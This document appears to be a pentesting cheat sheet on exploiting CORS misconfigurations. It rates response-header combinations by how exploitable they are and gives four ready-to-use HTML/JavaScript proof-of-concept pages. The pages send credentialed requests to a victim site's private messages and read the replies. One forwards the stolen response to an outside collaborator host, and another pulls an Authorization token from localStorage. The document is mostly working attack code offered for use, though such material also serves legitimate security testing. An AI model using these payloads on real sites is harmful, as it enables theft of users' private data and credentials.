Very useful scheme from @emgeekboy:

**POORLY IMPLEMENTED, BEST CASE FOR ATTACK:**
```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

**POORLY IMPLEMENTED, EXPLOITABLE:**
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**BAD IMPLEMENTATION BUT NOT EXPLOITABLE:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
or just
Access-Control-Allow-Origin: *
```

**ADITIONAL NOTES**

You can send custom headers adding the following line/s (i.e):

`xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");`

Maybe you can try do some IDOR if the application uses a custom auth header (not exploitable by default):

`xhttp.setRequestHeader("Authorization", "Bearer`

**EXPLOIT #1**
Simple alert popup.

```
<html>
<script>
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "https://vulnerable.web/private-messages", true);
xhttp.withCredentials = true;
xhttp.onload = function () {
alert(this.responseText);
};
xhttp.send();
</script>
</html>
```

**EXPLOIT #2**
CSRF Button and alert popup.

```
<!DOCTYPE html>
<html>
<head>
<script>
function cors() {
var xhttp = new XMLHttpRequest();

xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById("demo").innerHTML = alert(this.responseText);
}
};
xhttp.open("GET", "https://vulnerable.web/private-messages", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script></head>
<center>
<h2>CORS POC#2 EXPLOIT CSRF</h2>
<h3>Extract Authenticate Data</h3><div id="demo">
<button type="button" onclick="cors()">Exploit</button></div></body></html>
```

**EXPLOIT #3**
CSRF Button and a simple server to listen.

```
<!DOCTYPE html>
<html>
<head>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
//document.getElementById("demo").innerHTML = alert(this.responseText);
var nano = new XMLHttpRequest();
nano.open("GET", "http://mycollaborator.web:4444/?c=" + this.responseText, true);
nano.withCredentials = true;
nano.send();
}
};
xhttp.open("GET", "https://vulnerable.web/private-messages", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script></head>
<center>
<h2>CORS POC#3 Exploit EXFILTRATION</h2>
<h3>Extract Authenticate Data</h3><div id="demo">
<button type="button" onclick="cors()">Exploit</button></div></body></html>
```
**EXPLOIT #4**
Payload from @Ev4Si0N to exploit Auth BEARER Header vía window.localStorage.getItem

```
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract Data</h3>
 
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
 
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = "<p>" + this.responseText + "</p>";
    }
  };
  xhttp.open("GET", "https://IP_web_vulnerable/", true);
  xhttp.withCredentials = true;
  xhttp.setRequestHeader("Authorization", window.localStorage.getItem('Authorization'));
  xhttp.send();
}
</script>
 
</body>
</html>
```



